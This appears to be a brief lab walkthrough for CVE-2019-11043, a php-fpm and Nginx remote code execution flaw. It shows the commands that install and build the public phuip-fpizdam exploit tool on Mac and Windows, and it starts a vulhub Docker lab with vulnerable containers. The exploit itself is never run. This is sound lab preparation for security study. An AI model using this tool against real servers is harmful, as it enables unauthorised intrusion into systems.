# CVE-2019-11043 php-fpm+Nginx RCE

## 0x01 install phuip-fpizdam-Mac

`go get github.com/neex/phuip-fpizdam`

`go install github.com/neex/phuip-fpizdam`

![](./phuip-fpizdam-Mac.jpg)
```
ale@Pentest ~/go go get github.com/neex/phuip-fpizdam
ale@Pentest ~/go go install github.com/neex/phuip-fpizdam
ale@Pentest ~/go ls
bin src

ale@Pentest ~/go cd bin
ale@Pentest ~/go/bin ls
phuip-fpizdam

ale@Pentest ~/go/bin file phuip-fpizdam
phuip-fpizdam: Mach-O 64-bit executable x86_64

ale@Pentest ~/go/bin ls -lah phuip-fpizdam
-rwxr-xr-x  1 ale  staff   9.3M Oct 24 07:30 phuip-fpizdam

ale@Pentest ~/go/bin
```
## 0x02 install phuip-fpizdam-Windows

`https://github.com/neex/phuip-fpizdam/archive/master.zip`

`go build`

![](./phuip-fpizdam-Windows.jpg)

## docker for CVE-2019-11043

```
root@kali:~# cd ~/vulhub/php/CVE-2019-11043

root@kali:~/vulhub/php/CVE-2019-11043# ls

1.png  2.png  default.conf  docker-compose.yml  README.md  www

root@kali:~/vulhub/php/CVE-2019-11043# docker-compose up -d

Creating network "cve-2019-11043_default" with the default driver
Creating cve-2019-11043_php_1 ... done
Creating cve-2019-11043_nginx_1 ... done
root@kali:~/vulhub/php/CVE-2019-11043#


root@kali:~/vulhub/php/CVE-2019-11043# docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                              NAMES
9923d12fdff0 nginx:1 "nginx -g 'daemon of…" 43 seconds ago Up 41 seconds 0.0.0.0:8080->80/tcp cve-2019-11043_nginx_1
d3135c708e7b php:7.2.10-fpm "docker-php-entrypoi…" 44 seconds ago Up 42 seconds 9000/tcp cve-2019-11043_php_1
```
![](./CVE-2019-11043-docker.png)

